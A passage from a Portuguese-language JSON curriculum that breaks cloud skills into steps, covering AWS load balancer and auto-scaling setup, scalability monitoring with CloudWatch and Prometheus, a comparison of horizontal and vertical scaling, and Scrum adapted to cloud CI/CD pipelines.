                                    "CloudWatch Console",
                                    "Ferramenta de load test (ex: ab, hey)",
                                    "App simples rodando nas instâncias"
                                  ],
                                  "tips": "Use métricas compostas como RequestCount para apps web reais.",
                                  "learningObjective": "Automatizar scaling reativo baseado em thresholds de performance.",
                                  "commonMistakes": [
                                    "Cooldown muito curto causando flapping",
                                    "Alarmes em métricas erradas (use ASG aggregate)",
                                    "Política scale-in agressiva removendo instâncias prematuramente"
                                  ]
                                },
                                {
                                  "stepNumber": 5,
                                  "title": "Testar e Monitorar a Configuração Completa",
                                  "subSteps": [
                                    "Gere tráfego variável no ALB DNS para simular demanda (ex: script com ramp-up).",
                                    "Monitore métricas no CloudWatch: CPU, Healthy Hosts, Request Count.",
                                    "Ajuste thresholds se necessário e verifique logs de scaling activities.",
                                    "Documente configurações e exporte diagramas (ex: AWS Console screenshot)."
                                  ],
                                  "verification": "Sistema escala para 4 instâncias sob alta carga e reduz para 1 sob baixa, sem downtime.",
                                  "estimatedTime": "1 hour",
                                  "materials": [
                                    "Load testing tool",
                                    "CloudWatch Dashboards",
                                    "ALB DNS endpoint"
                                  ],
                                  "tips": "Crie um dashboard CloudWatch customizado para visualização rápida.",
                                  "learningObjective": "Validar end-to-end e iterar configurações para resiliência.",
                                  "commonMistakes": [
                                    "Testes insuficientes sem simulação real",
                                    "Ignorar custos de scaling excessivo",
                                    "Não checar health checks durante testes"
                                  ]
                                }
                              ],
                              "practicalExample": "Configure um ALB e ASG para uma aplicação web Node.js simples hospedada em instâncias EC2. Sob tráfego baixo (10 req/s), mantém 2 instâncias; com pico (100 req/s), escala para 4, distribuindo load e reduzindo CPU <50%.",
                              "finalVerifications": [
                                "Load balancer mostra múltiplos healthy targets distribuindo tráfego.",
                                "ASG adiciona instâncias quando CPU >70% e remove quando <40%.",
                                "Health checks passam em todas instâncias ativas.",
                                "Nenhum downtime durante scaling events.",
                                "CloudWatch alarms disparam corretamente sem falsos positivos.",
                                "Custos estimados no Billing Console alinham com scaling esperado."
                              ],
                              "assessmentCriteria": [
                                "Configurações de ALB e ASG sem erros de validação AWS.",
                                "Políticas de scaling respondem corretamente a métricas CPU em testes.",
                                "Distribuição de tráfego uniforme comprovada via logs ALB.",
                                "Documentação completa de steps e métricas observadas.",
                                "Otimização de custos (ex: spot instances se aplicável).",
                                "Resiliência testada em múltiplas AZs."
                              ],
                              "crossCurricularConnections": [
                                "Redes: Security Groups, VPC e Subnets.",
                                "Monitoramento: CloudWatch Alarms e Logs.",
                                "DevOps: Infra as Code (CloudFormation/Terraform para automação).",
                                "Segurança: IAM roles para ASG, HTTPS no ALB.",
                                "Desenvolvimento: User-data scripts e CI/CD integration."
                              ],
                              "realWorldApplication": "Em e-commerces como Amazon durante Black Friday, load balancers e auto-scaling garantem disponibilidade adicionando milhares de servidores dinamicamente para lidar com milhões de acessos simultâneos, reduzindo custos pós-pico."
                            },
                            "estimatedTime": "3 horas",
                            "difficulty": "advanced",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.4.2.2.3",
                            "name": "Monitorar e otimizar escalabilidade horizontal",
                            "description": "Utilizar ferramentas como CloudWatch ou Prometheus para monitorar latência, throughput e erros, ajustando políticas de scaling e otimizando distribuição de tráfego em clusters.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Configurar Ferramentas de Monitoramento",
                                  "subSteps": [
                                    "Criar uma conta ou cluster de teste em AWS EKS ou similar com Prometheus/CloudWatch.",
                                    "Instalar e configurar agentes de coleta de métricas (ex: node-exporter para Prometheus ou CloudWatch Agent).",
                                    "Definir dashboards iniciais para visualização de métricas básicas como CPU e memória.",
                                    "Configurar alertas iniciais para thresholds críticos (ex: CPU > 80%).",
                                    "Testar a coleta de dados enviando tráfego simulado."
                                  ],
                                  "verification": "Verificar se métricas estão sendo coletadas e exibidas em dashboards sem erros.",
                                  "estimatedTime": "2-3 horas",
                                  "materials": [
                                    "Conta AWS gratuita ou cluster Kubernetes local (Minikube)",
                                    "Documentação CloudWatch/Prometheus",
                                    "Ferramentas como kubectl ou AWS CLI"
                                  ],
                                  "tips": "Comece com ambiente de desenvolvimento para evitar custos; use templates YAML prontos para aceleração.",
                                  "learningObjective": "Configurar infraestrutura de monitoramento básica para clusters escaláveis.",
                                  "commonMistakes": [
                                    "Esquecer permissões IAM para CloudWatch",
                                    "Configurar métricas erradas (ex: focar só em CPU ignorando rede)",
                                    "Não testar coleta inicial"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Monitorar Métricas Chave de Desempenho",
                                  "subSteps": [
                                    "Identificar e configurar monitoramento de latência (p95/p99 response time), throughput (RPS) e erros (5xx/4xx rates).",
                                    "Integrar métricas de aplicação com ferramentas (ex: custom metrics via SDK).",
                                    "Criar queries e gráficos para correlação entre métricas (ex: latência vs throughput).",
                                    "Configurar retenção de dados históricos (ex: 14 dias).",
                                    "Simular cargas variadas com ferramentas como Apache Bench ou Locust."
                                  ],
                                  "verification": "Dashboards mostram flutuações em latência, throughput e erros sob carga simulada.",
                                  "estimatedTime": "2 horas",
                                  "materials": [
                                    "Ferramentas de load testing: Locust ou JMeter",
                                    "Query language: PromQL ou CloudWatch Logs Insights"
                                  ],
                                  "tips": "Foque em percentiles para latência realista; agrupe métricas por serviço/pod.",
                                  "learningObjective": "Selecionar e visualizar métricas essenciais para escalabilidade horizontal.",
                                  "commonMistakes": [
                                    "Monitorar apenas médias em vez de percentiles",
                                    "Ignorar erros de rede",
                                    "Sobrecarregar o sistema com monitoramento excessivo"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Analisar Dados e Ajustar Políticas de Scaling",
                                  "subSteps": [
                                    "Analisar logs e métricas para identificar gargalos (ex: latência alta com throughput baixo).",
                                    "Configurar Auto Scaling Groups (ASG) ou HPA no Kubernetes com base em métricas compostas.",
                                    "Ajustar políticas: definir cool-down periods, min/max replicas e thresholds dinâmicos.",
                                    "Criar alarmes que triggeram scaling (ex: latência > 500ms por 5min).",
                                    "Executar testes de stress e validar auto-scaling."
                                  ],
                                  "verification": "Sistema adiciona/remove instâncias automaticamente em resposta a alarmes.",
                                  "estimatedTime": "3 horas",
                                  "materials": [
                                    "AWS ASG ou Kubernetes HPA docs",
                                    "Ferramentas de stress: k6 ou Artillery"
                                  ],
                                  "tips": "Use scaling baseado em múltiplas métricas para evitar thrashing; monitore custos durante testes.",
                                  "learningObjective": "Interpretar dados de monitoramento para otimizar políticas de escalabilidade.",
                                  "commonMistakes": [
                                    "Thresholds muito agressivos causando flapping",
                                    "Não considerar warm-up time para novas instâncias",
                                    "Ignorar assimetria entre métricas"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Otimizar Distribuição de Tráfego em Clusters",
                                  "subSteps": [
                                    "Configurar Load Balancer (ALB/ELB ou Ingress com weights).",
                                    "Implementar health checks e routing baseado em métricas (ex: least connections).",
                                    "Otimizar affinity/session stickiness se necessário.",
                                    "Testar failover e distribuição sob carga desigual.",
                                    "Iterar com base em métricas pós-otimização."
                                  ],
                                  "verification": "Tráfego distribuído uniformemente; health checks removem instâncias ruins automaticamente.",
                                  "estimatedTime": "2 horas",
                                  "materials": [
                                    "AWS ALB docs ou NGINX Ingress controller",
                                    "Ferramentas de tracing: Jaeger ou X-Ray"
                                  ],
                                  "tips": "Priorize least-connections sobre round-robin para workloads variáveis; integre tracing para visibilidade.",
                                  "learningObjective": "Melhorar eficiência de clusters via balanceamento inteligente de tráfego.",
                                  "commonMistakes": [
                                    "Health checks muito lentos",
                                    "Não configurar draining para scale-down",
                                    "Ignorar sticky sessions em apps stateful"
                                  ]
                                }
                              ],
                              "practicalExample": "Em um cluster EKS rodando um API de e-commerce, configure CloudWatch para alertar quando latência p99 > 300ms e erros 5xx > 2%. Sob pico de Black Friday (simulado com Locust), o ASG escala de 2 para 10 pods, e o ALB redistribui tráfego, reduzindo latência para <200ms.",
                              "finalVerifications": [
                                "Dashboards exibem latência, throughput e erros em tempo real sem lacunas.",
                                "Auto-scaling ativa/desativa corretamente sob cargas variadas.",
                                "Load balancer distribui tráfego uniformemente (desvio <10%).",
                                "Alarmes disparam e resolvem sem falsos positivos.",
                                "Custo de scaling fica dentro de 20% do baseline.",
                                "Sistema mantém 99% uptime em testes de 1h."
                              ],
                              "assessmentCriteria": [
                                "Configuração completa de métricas chave com queries precisas (80% cobertura).",
                                "Políticas de scaling respondem em <2min a mudanças de carga.",
                                "Otimização reduz latência em pelo menos 30% sob stress.",
                                "Análise identifica e corrige 3+ gargalos simulados.",
                                "Documentação de setup e lições aprendidas.",
                                "Testes reproduzíveis com scripts automatizados."
                              ],
                              "crossCurricularConnections": [
                                "DevOps: Integração com CI/CD para deployments canary.",
                                "Segurança: Monitoramento de ameaças via métricas de erros e tráfego anômalo.",
                                "Análise de Dados: Uso de ML para predição de scaling (ex: AWS Forecast).",
                                "Desenvolvimento Full-Stack: Otimização de código para melhor throughput.",
                                "Gestão de Projetos: Avaliação de ROI em escalabilidade."
                              ],
                              "realWorldApplication": "Em plataformas como Netflix ou Uber, monitoramento com Prometheus/Grafana e scaling horizontal via Kubernetes HPA garante que milhões de requests/seg sejam gerenciados sem downtime, otimizando custos em até 50% durante picos sazonais."
                            },
                            "estimatedTime": "2 horas",
                            "difficulty": "advanced",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.4.2.2.4",
                            "name": "Comparar escalabilidade horizontal e vertical",
                            "description": "Analisar trade-offs entre as abordagens, como custo linear vs. exponencial, complexidade de gerenciamento e cenários ideais (ex: horizontal para tráfego imprevisível, vertical para picos curtos).",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Entender os Conceitos Básicos de Escalabilidade Horizontal e Vertical",
                                  "subSteps": [
                                    "Defina escalabilidade vertical: adicionar mais recursos (CPU, RAM) a uma única máquina.",
                                    "Defina escalabilidade horizontal: adicionar mais máquinas/instâncias para distribuir a carga.",
                                    "Identifique limitações: vertical limitada por hardware máximo; horizontal por estado e distribuição.",
                                    "Estude exemplos iniciais: vertical como upgrade de servidor; horizontal como auto-scaling em nuvem.",
                                    "Crie um diagrama simples comparando as duas abordagens."
                                  ],
                                  "verification": "Crie um diagrama ou tabela resumindo definições e diferenças básicas.",
                                  "estimatedTime": "1 hora",
                                  "materials": [
                                    "Documentação AWS/GCP sobre scaling",
                                    "Ferramenta de diagrama como Draw.io",
                                    "Artigos sobre scaling types"
                                  ],
                                  "tips": "Use analogias: vertical como dar mais músculos a uma pessoa; horizontal como contratar mais pessoas.",
                                  "learningObjective": "Diferenciar conceitualmente escalabilidade horizontal e vertical.",
                                  "commonMistakes": [
                                    "Confundir vertical com replicação de dados",
                                    "Ignorar limites físicos do hardware na vertical"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Analisar Trade-offs Principais",
                                  "subSteps": [
                                    "Compare custos: vertical (linear com upgrades); horizontal (exponencial com gerenciamento).",
                                    "Avalie complexidade: vertical simples; horizontal requer balanceadores, sessões stateless.",
                                    "Discuta downtime: vertical pode precisar de restart; horizontal rolling updates.",
                                    "Examine performance: vertical para workloads CPU-bound; horizontal para throughput.",
                                    "Calcule um exemplo simples de custo para 10x load em cada abordagem."
                                  ],
                                  "verification": "Elabore uma tabela de trade-offs com pelo menos 5 categorias (custo, complexidade, etc.).",
                                  "estimatedTime": "1.5 horas",
                                  "materials": [
                                    "Calculadoras de custo AWS/GCP",
                                    "Planilhas Excel/Google Sheets",
                                    "Whitepapers sobre scaling"
                                  ],
                                  "tips": "Sempre considere o TCO (Total Cost of Ownership), não só custo inicial.",
                                  "learningObjective": "Identificar e quantificar trade-offs quantitativos e qualitativos.",
                                  "commonMistakes": [
                                    "Subestimar custos de rede na horizontal",
                                    "Ignorar latência introduzida pela distribuição"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Identificar Cenários Ideais de Aplicação",
                                  "subSteps": [
                                    "Liste cenários para horizontal: tráfego imprevisível (e-commerce Black Friday), apps stateless.",
                                    "Liste cenários para vertical: picos curtos previsíveis, workloads monolíticos CPU-intensive.",
                                    "Analise híbridos: quando combinar ambas (ex: vertical primeiro, depois horizontal).",
                                    "Estude cases: Netflix (horizontal), bancos legados (vertical).",
                                    "Avalie métricas: use throughput, latência e disponibilidade para decidir."
                                  ],
                                  "verification": "Selecione 3 cenários reais e justifique a escolha de scaling.",
                                  "estimatedTime": "1 hora",
                                  "materials": [
                                    "Case studies Netflix/AWS",
                                    "Ferramentas de monitoring como Prometheus",
                                    "Vídeos tutoriais sobre auto-scaling"
                                  ],
                                  "tips": "Pense em 'statelessness' como pré-requisito chave para horizontal.",
                                  "learningObjective": "Mapear abordagens de scaling a cenários específicos.",
                                  "commonMistakes": [
                                    "Recomendar horizontal para apps stateful sem adaptações",
                                    "Usar vertical para crescimento ilimitado"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Praticar Comparação em um Caso de Estudo",
                                  "subSteps": [
                                    "Escolha um app exemplo (ex: API web com tráfego variável).",
                                    "Simule scaling vertical: configure instância maior e meça performance.",
                                    "Simule scaling horizontal: adicione réplicas e balanceador, meça.",
                                    "Compare métricas: custo, tempo de resposta, escalabilidade máxima.",
                                    "Documente recomendações baseadas na análise."
                                  ],
                                  "verification": "Gere relatório com métricas comparativas e gráficos.",
                                  "estimatedTime": "2 horas",
                                  "materials": [
                                    "Ambiente nuvem gratuito (AWS Free Tier/GCP)",
                                    "Docker para simulação local",
                                    "Ferramentas como Apache Bench para load testing"
                                  ],
                                  "tips": "Comece com simulação local para evitar custos reais.",
                                  "learningObjective": "Aplicar comparação prática e tirar conclusões acionáveis.",
                                  "commonMistakes": [
                                    "Não testar com load real",
                                    "Ignorar overhead de comunicação na horizontal"
                                  ]
                                }
                              ],
                              "practicalExample": "Em um e-commerce como Amazon durante Black Friday: use horizontal para lidar com picos imprevisíveis adicionando instâncias auto-scaling; para relatórios internos CPU-heavy, use vertical em servidores dedicados.",
                              "finalVerifications": [
                                "Explicar diferenças em 1 minuto sem hesitação.",
                                "Criar tabela de trade-offs precisa.",
                                "Recomendar abordagem para 3 cenários dados.",
                                "Identificar quando híbrido é ideal.",
                                "Calcular custo aproximado para 5x load em ambas.",
                                "Discutir impacto em disponibilidade e latência."
                              ],
                              "assessmentCriteria": [
                                "Precisão conceitual (definições corretas).",
                                "Profundidade nos trade-offs (custo, complexidade quantificados).",
                                "Relevância de cenários (alinhados a casos reais).",
                                "Qualidade da análise prática (métricas usadas).",
                                "Clareza na comunicação (diagramas/tabelas eficazes).",
                                "Consideração de melhores práticas (stateless, monitoring)."
                              ],
                              "crossCurricularConnections": [
                                "Economia/Gestão: Análise de custo-benefício e ROI de infraestrutura.",
                                "Desenvolvimento de Software: Arquitetura stateless e microservices.",
                                "Gerenciamento de Projetos: Planejamento de capacidade e risco de downtime.",
                                "Matemática: Modelagem exponencial vs. linear de crescimento.",
                                "Negócios: Estratégias de escalabilidade para startups vs. enterprises."
                              ],
                              "realWorldApplication": "Empresas como Netflix usam escalabilidade horizontal para streaming global com auto-scaling no AWS, enquanto bancos tradicionais optam por vertical em mainframes para transações seguras e previsíveis, otimizando custos e performance conforme demanda."
                            },
                            "estimatedTime": "1 hora",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          }
                        ]
                      }
                    ]
                  },
                  {
                    "id": "10.1.4.3",
                    "name": "Desenvolvimento Ágil na Nuvem",
                    "description": "Integração de metodologias ágeis com CI/CD e DevOps em ambientes cloud.",
                    "individualConcepts": [
                      {
                        "id": "10.1.4.3.1",
                        "name": "Metodologias Ágeis Adaptadas à Nuvem",
                        "description": "Exploração dos princípios ágeis como Scrum e Kanban adaptados para desenvolvimento em ambientes cloud, enfatizando iterações rápidas e escalabilidade.",
                        "specificSkills": [
                          {
                            "id": "10.1.4.3.1.1",
                            "name": "Identificar princípios ágeis para cloud",
                            "description": "Reconhecer e mapear os 12 princípios do Manifesto Ágil para cenários de computação em nuvem, incluindo entregas frequentes e colaboração com stakeholders remotos.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Memorizar e compreender os 12 princípios do Manifesto Ágil",
                                  "subSteps": [
                                    "Acesse o Manifesto Ágil oficial e leia os 12 princípios originais.",
                                    "Anote cada princípio em suas próprias palavras, destacando palavras-chave como 'entrega contínua' e 'colaboração'.",
                                    "Crie um mapa mental conectando os princípios aos valores ágeis (indivíduos e interações, software funcional, colaboração com o cliente, resposta à mudança).",
                                    "Discuta os princípios com um parceiro ou em um fórum para reforçar a compreensão.",
                                    "Teste-se recitando os princípios sem consultar notas."
                                  ],
                                  "verification": "Recitar os 12 princípios corretamente de memória e explicar um em detalhes.",
                                  "estimatedTime": "2 horas",
                                  "materials": "Site oficial do Manifesto Ágil (agilemanifesto.org), caderno ou ferramenta de mind mapping como MindMeister, flashcards digitais (Anki).",
                                  "tips": "Use mnemônicos para lembrar a sequência, como associar números a imagens vívidas.",
                                  "learningObjective": "Dominar o conteúdo textual e conceitual dos 12 princípios ágeis.",
                                  "commonMistakes": "Confundir princípios com práticas Scrum/Kanban; focar apenas em memorização sem compreensão."
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Analisar cenários típicos de computação em nuvem",
                                  "subSteps": [
                                    "Liste características da cloud como escalabilidade, CI/CD pipelines, ambientes multi-região e ferramentas colaborativas (ex: AWS, Azure DevOps).",
                                    "Identifique desafios cloud-specific: latência em equipes remotas, provisionamento dinâmico e conformidade regulatória.",
                                    "Pesquise casos de uso cloud: microservices serverless, containers Kubernetes e IaC (Infrastructure as Code).",
                                    "Compare desenvolvimento tradicional vs. cloud-native em termos de velocidade e colaboração.",
                                    "Crie uma tabela de 'desafios cloud' vs. 'oportunidades ágeis'."
                                  ],
                                  "verification": "Produzir uma tabela com pelo menos 5 cenários cloud e suas implicações ágeis.",
                                  "estimatedTime": "1.5 horas",
                                  "materials": "Documentação AWS/Azure/GCP, artigos sobre cloud-native agile (ex: CNCF resources), planilha Google Sheets.",
                                  "tips": "Comece com nuvens populares como AWS para exemplos concretos.",
                                  "learningObjective": "Reconhecer como o ambiente cloud amplifica ou modifica práticas ágeis.",
                                  "commonMistakes": "Ignorar aspectos de custo e segurança na cloud; superestimar similaridades com on-premise."
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Mapear os 12 princípios ágeis para contextos de cloud",
                                  "subSteps": [
                                    "Para cada princípio, identifique 1-2 adaptações cloud: ex. princípio 3 (entregas frequentes) → GitHub Actions + AWS Lambda.",
                                    "Agrupe princípios por temas: cliente/colaboracao (1,2,4), sustentabilidade (8,12), simplicidade (10).",
                                    "Crie um diagrama de mapeamento visual ligando princípios a ferramentas cloud (ex. Slack/Teams para princípio 6).",
                                    "Valide o mapeamento pesquisando exemplos reais de empresas (Netflix, Spotify).",
                                    "Ajuste mapeamentos com base em feedback ou auto-revisão."
                                  ],
                                  "verification": "Gerar um documento ou diagrama com mapeamentos completos para todos os 12 princípios.",
                                  "estimatedTime": "3 horas",
                                  "materials": "Ferramenta de diagramação (Draw.io ou Lucidchart), exemplos de case studies (blogs AWS/Netflix), timer para foco.",
                                  "tips": "Use cores para destacar princípios de alto impacto na cloud, como entregas e colaboração.",
                                  "learningObjective": "Aplicar princípios ágeis de forma contextualizada à computação em nuvem.",
                                  "commonMistakes": "Mapeamentos genéricos sem exemplos cloud-specific; pular princípios menos óbvios como 5 e 11."
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Explorar entregas frequentes e colaboração remota em cloud",
                                  "subSteps": [
                                    "Simule uma entrega frequente: configure um pipeline CI/CD simples em GitHub Actions para deploy em cloud.",
                                    "Teste ferramentas de colaboração remota: Jira + Slack integrado com cloud monitoring (CloudWatch).",
                                    "Analise como princípios 3,4,6 se aplicam: daily standups virtuais e auto-deploy.",
                                    "Documente lições aprendidas de uma simulação de sprint cloud.",
                                    "Compare com cenários não-cloud para reforçar adaptações."
                                  ],
                                  "verification": "Executar uma demo de pipeline e relatar como 3 princípios foram aplicados.",
                                  "estimatedTime": "2.5 horas",
                                  "materials": "Conta gratuita GitHub/AWS Free Tier, Jira/Slack trial, vídeo tutoriais CI/CD.",
                                  "tips": "Grave a simulação em vídeo para revisão posterior.",
                                  "learningObjective": "Praticar mapeamento em cenários práticos de entregas e colaboração na cloud.",
                                  "commonMistakes": "Configurar pipelines complexos demais para iniciantes; negligenciar time zones em colaboração remota."
                                }
                              ],
                              "practicalExample": "Em um projeto de e-commerce na AWS, mapear princípio 3 (entregas frequentes) para um pipeline CI/CD com CodePipeline que deploya atualizações diárias de estoque via Lambda, permitindo colaboração remota via Microsoft Teams integrado ao AWS Chatbot, garantindo stakeholders vejam mudanças em tempo real.",
                              "finalVerifications": [
                                "Listar corretamente os 12 princípios do Manifesto Ágil sem erros.",
                                "Mapear cada princípio para pelo menos um exemplo cloud-specific.",
                                "Explicar adaptações para entregas frequentes usando CI/CD tools.",
                                "Descrever colaboração remota com ferramentas cloud como Teams/Slack.",
                                "Identificar 3 conexões entre princípios e benefícios cloud (ex. escalabilidade).",
                                "Demonstrar via diagrama ou tabela o mapeamento completo."
                              ],
                              "assessmentCriteria": [
                                "Precisão no recall dos 12 princípios (100% correto).",
                                "Profundidade dos mapeamentos cloud (exemplos concretos e relevantes).",
                                "Criatividade nas adaptações para cenários remotos/escaláveis.",
                                "Coerência lógica entre princípios e contextos cloud.",
                                "Uso de terminologia técnica cloud (CI/CD, IaC, serverless).",
                                "Capacidade de verbalizar ou documentar o mapeamento claramente."
                              ],
                              "crossCurricularConnections": [
                                "DevOps: Integração com pipelines CI/CD e IaC (Terraform).",
                                "Gestão de Projetos: Alinhamento com OKRs em ambientes cloud.",
                                "Segurança da Informação: Princípios ágeis aplicados a compliance cloud (ex. GDPR).",
                                "Arquitetura de Software: Microservices e serverless alinhados a simplicidade ágil.",
                                "Negócios: Colaboração com stakeholders para valor contínuo em SaaS."
                              ],
                              "realWorldApplication": "Empresas como Netflix usam princípios ágeis na cloud (AWS) para entregas diárias de features via Spinnaker CI/CD, colaborando remotamente com times globais via Slack e Jira, permitindo respostas rápidas a demandas de usuários e escalabilidade durante picos de tráfego."
                            },
                            "estimatedTime": "2 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.4.3.1.2",
                            "name": "Adaptar Scrum para pipelines cloud",
                            "description": "Configurar sprints e daily stand-ups integrados com ferramentas cloud como AWS CodeCommit e Azure DevOps para aceleração de ciclos de desenvolvimento.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Entender e Mapear Princípios do Scrum para Pipelines Cloud",
                                  "subSteps": [
                                    "Revise os papéis Scrum (Product Owner, Scrum Master, Development Team) e adapte-os para equipes cloud (ex: DevOps Engineer como Scrum Master).",
                                    "Identifique artefatos Scrum (Product Backlog, Sprint Backlog, Incremento) e mapeie para pipelines CI/CD (ex: branches para backlogs).",
                                    "Analise eventos Scrum (Sprint Planning, Daily Scrum, Review, Retrospective) e planeje integrações com ferramentas cloud.",
                                    "Defina métricas de aceleração: tempo de ciclo, lead time, deployment frequency.",
                                    "Crie um diagrama de fluxo adaptado usando ferramentas como Lucidchart ou Draw.io."
                                  ],
                                  "verification": "Diagrama de mapeamento completo com todos os elementos Scrum adaptados documentado e revisado.",
                                  "estimatedTime": "2 horas",
                                  "materials": [
                                    "Documentação Scrum oficial (scrumguides.org)",
                                    "AWS CodeCommit docs",
                                    "Azure DevOps docs",
                                    "Ferramenta de diagramação (Draw.io)"
                                  ],
                                  "tips": "Comece com um backlog simples de 5-10 itens para testar o mapeamento.",
                                  "learningObjective": "Compreender como os princípios ágeis do Scrum se integram a fluxos de trabalho cloud nativos.",
                                  "commonMistakes": [
                                    "Ignorar métricas cloud-specific como deployment frequency",
                                    "Não adaptar papéis para equipes DevOps híbridas",
                                    "Sobrecarregar o Product Backlog sem priorização cloud"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Configurar Repositórios e Ferramentas Cloud Básicas",
                                  "subSteps": [
                                    "Crie um repositório no AWS CodeCommit ou Azure Repos com estrutura de branches (main, develop, feature/*).",
                                    "Configure autenticação e permissões para a equipe Scrum (IAM roles no AWS, grupos no Azure).",
                                    "Integre webhooks para notificações automáticas em canais de equipe (Slack/Teams).",
                                    "Defina pipelines CI/CD iniciais com builds automáticos em branches feature.",
                                    "Teste commit e push para validar setup básico."
                                  ],
                                  "verification": "Repositório funcional com pipeline CI rodando em um commit de teste, logs acessíveis.",
                                  "estimatedTime": "3 horas",
                                  "materials": [
                                    "Conta AWS/Azure ativa",
                                    "CLI AWS ou Azure CLI",
                                    "IDE com Git (VS Code)",
                                    "Documentação de CodeCommit/Azure Repos"
                                  ],
                                  "tips": "Use templates de pipeline prontos para acelerar (ex: aws-codepipeline-template).",
                                  "learningObjective": "Dominar configuração inicial de repositórios cloud integrados a fluxos Scrum.",
                                  "commonMistakes": [
                                    "Configurações de permissão muito amplas levando a riscos de segurança",
                                    "Esquecer webhooks para visibilidade da equipe",
                                    "Não testar em branch isolada"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Definir e Configurar Sprints Integrados com Pipelines CI/CD",
                                  "subSteps": [
                                    "Planeje um sprint de 2 semanas no Azure Boards ou Jira integrado ao repo cloud.",
                                    "Mapeie tarefas do Sprint Backlog para issues/PRs que triggeram pipelines automáticos.",
                                    "Configure gates de aprovação no pipeline (ex: code review antes de merge para staging).",
                                    "Automatize deployments para ambientes (dev/staging/prod) baseados em sprint milestones.",
                                    "Integre relatórios de burndown com métricas de pipeline (ex: usando AWS X-Ray ou Azure Monitor)."
                                  ],
                                  "verification": "Sprint backlog com 5+ tarefas linked a PRs, pipeline executando end-to-end para uma tarefa.",
                                  "estimatedTime": "4 horas",
                                  "materials": [
                                    "Azure Boards ou AWS CodeStar",
                                    "Pipelines YAML para CI/CD",
                                    "Ferramentas de monitoring (CloudWatch, Azure Monitor)"
                                  ],
                                  "tips": "Use labels Git para categorizar tarefas por sprint (sprint-1, sprint-2).",
                                  "learningObjective": "Implementar sprints onde commits e merges impulsionam aceleração via automação cloud.",
                                  "commonMistakes": [
                                    "Pipelines sem gates causando deploys instáveis",
                                    "Backlogs não sincronizados com branches",
                                    "Ignorar limites de sprint para evitar burnout"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Implementar Daily Stand-ups e Monitoramento Contínuo",
                                  "subSteps": [
                                    "Configure daily stand-ups via integração (ex: bot no Teams/Slack que puxa status de PRs/pipelines do CodeCommit).",
                                    "Crie dashboard unificado (ex: Azure Dashboards ou Grafana) com métricas Scrum + cloud (velocity, pipeline success rate).",
                                    "Realize retrospectivas com análise de logs de falhas em pipelines.",
                                    "Otimize sprints baseados em dados: reduza tempos de build/deploy iterativamente.",
                                    "Documente lições aprendidas em um wiki do projeto."
                                  ],
                                  "verification": "Daily stand-up simulado com bot reportando status real, dashboard com métricas ao vivo.",
                                  "estimatedTime": "2.5 horas",
                                  "materials": [
                                    "Slack/Teams com webhooks",
                                    "Azure Dashboards ou AWS QuickSight",
                                    "Templates de bot (AWS Chatbot)"
                                  ],
                                  "tips": "Limite stand-ups a 15 min focando em blockers de pipeline.",
                                  "learningObjective": "Estabelecer rituais diários Scrum impulsionados por dados cloud para aceleração contínua.",
                                  "commonMistakes": [
                                    "Stand-ups sem dados reais de pipeline",
                                    "Dashboards sobrecarregados sem filtros",
                                    "Retrospectivas sem ações concretas"
                                  ]
                                },
                                {
                                  "stepNumber": 5,
                                  "title": "Testar, Validar e Iterar o Framework Adaptado",
                                  "subSteps": [
                                    "Execute um sprint piloto completo com equipe simulada ou real.",
                                    "Meça aceleração: compare ciclo pré/pós adaptação (ex: deploy time reduzido 50%).",
                                    "Colete feedback via survey anônimo e ajuste mapeamentos.",
                                    "Escalabilidade: teste com mais tarefas/equipes.",
                                    "Documente o framework completo como template reutilizável."
                                  ],
                                  "verification": "Relatório de sprint piloto com métricas de aceleração comprovadas e template documentado.",
                                  "estimatedTime": "3 horas",
                                  "materials": [
                                    "Ferramentas de survey (Google Forms)",
                                    "Planilha para métricas (Excel/Google Sheets)",
                                    "Wiki do projeto"
                                  ],
                                  "tips": "Use DORA metrics (Deployment Frequency, Lead Time) para benchmark.",
                                  "learningObjective": "Validar e refinar a adaptação Scrum-cloud para produção sustentável.",
                                  "commonMistakes": [
                                    "Teste sem baseline prévia",
                                    "Ignorar feedback qualitativo",
                                    "Não planejar escalabilidade"
                                  ]
                                }
                              ],
                              "practicalExample": "Em um projeto de e-commerce, configure um sprint de 2 semanas no Azure DevOps: Product Backlog com features de checkout; daily stand-ups via bot Slack puxando PRs do AWS CodeCommit; pipeline CI/CD deploya para staging em merges de feature branches, acelerando deploys de 1 dia para 1 hora.",
                              "finalVerifications": [
                                "Sprints configurados e completados com incrementos deployados em cloud.",
                                "Daily stand-ups automatizados reportando status de pipelines.",
                                "Métricas de aceleração comprovadas (ex: ciclo reduzido >30%).",
                                "Dashboard unificado acessível à equipe.",
                                "Template de framework documentado e reutilizável.",
                                "Retrospectiva realizada com ações implementadas."
                              ],
                              "assessmentCriteria": [
                                "Integração seamless entre eventos Scrum e triggers de pipeline (100% automatizado).",
                                "Aceleração mensurável em métricas DORA (Deployment Frequency > daily).",
                                "Adesão aos papéis e artefatos Scrum adaptados (sem desvios >10%).",
                                "Segurança e compliance em permissões cloud (auditoria zero falhas).",
                                "Feedback da equipe: satisfação >80% em survey.",
                                "Escalabilidade demonstrada em sprint piloto."
                              ],
                              "crossCurricularConnections": [
